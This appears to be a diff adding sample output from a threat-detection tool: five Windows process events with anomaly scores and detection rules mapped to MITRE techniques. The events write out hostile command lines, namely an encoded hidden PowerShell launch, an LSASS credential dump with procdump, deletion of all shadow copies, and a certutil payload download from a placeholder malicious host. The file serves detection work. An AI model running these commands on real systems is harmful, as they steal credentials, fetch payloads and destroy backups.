@@ -1,0 +1,146 @@
+[
+    {
+        "timestamp": "2026-04-28 12:13:24.482916",
+        "process_name": "powershell.exe",
+        "parent_process_name": "cmd.exe",
+        "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA...",
+        "ml_anomaly": true,
+        "ml_score": -0.3304338539031545,
+        "rules_triggered": [
+            {
+                "id": "rule_01",
+                "name": "Suspicious PowerShell Encoded Command",
+                "description": "Detects execution of PowerShell with encoded command flags.",
+                "mitre_technique": "T1059.001",
+                "mitre_tactic": "Execution",
+                "condition": {
+                    "field": "CommandLine",
+                    "operator": "contains_any",
+                    "values": [
+                        "-enc",
+                        "-EncodedCommand",
+                        "-e "
+                    ]
+                },
+                "severity": "high"
+            }
+        ],
+        "mitre_tactics": [
+            "Execution"
+        ],
+        "mitre_techniques": [
+            "T1059.001"
+        ]
+    },
+    {
+        "timestamp": "2026-04-28 13:13:24.482916",
+        "process_name": "procdump.exe",
+        "parent_process_name": "powershell.exe",
+        "command_line": "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+        "ml_anomaly": true,
+        "ml_score": -0.20607630364560925,
+        "rules_triggered": [
+            {
+                "id": "rule_02",
+                "name": "Credential Dumping via LSASS",
+                "description": "Detects suspicious tools accessing lsass.exe for credential dumping.",
+                "mitre_technique": "T1003.001",
+                "mitre_tactic": "Credential Access",
+                "condition": {
+                    "field": "CommandLine",
+                    "operator": "contains_all",
+                    "values": [
+                        "lsass.exe",
+                        "dump"
+                    ]
+                },
+                "severity": "critical"
+            }
+        ],
+        "mitre_tactics": [
+            "Credential Access"
+        ],
+        "mitre_techniques": [
+            "T1003.001"
+        ]
+    },
+    {
+        "timestamp": "2026-04-28 13:43:24.482916",
+        "process_name": "vssadmin.exe",
+        "parent_process_name": "cmd.exe",
+        "command_line": "vssadmin.exe delete shadows /all /quiet",
+        "ml_anomaly": true,
+        "ml_score": -0.2822789456057103,
+        "rules_triggered": [
+            {
+                "id": "rule_03",
+                "name": "Shadow Copy Deletion",
+                "description": "Detects deletion of volume shadow copies (Ransomware behavior).",
+                "mitre_technique": "T1490",
+                "mitre_tactic": "Impact",
+                "condition": {
+                    "field": "CommandLine",
+                    "operator": "contains_all",
+                    "values": [
+                        "vssadmin",
+                        "delete",
+                        "shadows"
+                    ]
+                },
+                "severity": "critical"
+            }
+        ],
+        "mitre_tactics": [
+            "Impact"
+        ],
+        "mitre_techniques": [
+            "T1490"
+        ]
+    },
+    {
+        "timestamp": "2026-04-28 14:03:24.482916",
+        "process_name": "certutil.exe",
+        "parent_process_name": "cmd.exe",
+        "command_line": "certutil.exe -urlcache -split -f http://malicious.com/payload.exe payload.exe",
+        "ml_anomaly": true,
+        "ml_score": -0.32452357169598367,
+        "rules_triggered": [
+            {
+                "id": "rule_04",
+                "name": "Suspicious Network Connection via Certutil",
+                "description": "Detects certutil being used to download files.",
+                "mitre_technique": "T1105",
+                "mitre_tactic": "Command and Control",
+                "condition": {
+                    "field": "CommandLine",
+                    "operator": "contains_all",
+                    "values": [
+                        "certutil.exe",
+                        "-urlcache",
+                        "-split"
+                    ]
+                },
+                "severity": "high"
+            }
+        ],
+        "mitre_tactics": [
+            "Command and Control"
+        ],
+        "mitre_techniques": [
+            "T1105"
+        ]
+    },
+    {
+        "timestamp": "2026-04-28 14:13:24.482916",
+        "process_name": "unknown_dropper.exe",
+        "parent_process_name": "explorer.exe",
+        "command_line": "unknown_dropper.exe !@#$$%^&*() {malicious_payload_unpacking} --silent",
+        "ml_anomaly": true,
+        "ml_score": -0.22285332512324663,
+        "rules_triggered": [],
+        "mitre_tactics": [
+            "Unknown / Suspicious Behavior"
+        ],
+        "mitre_techniques": []
+    }
+]
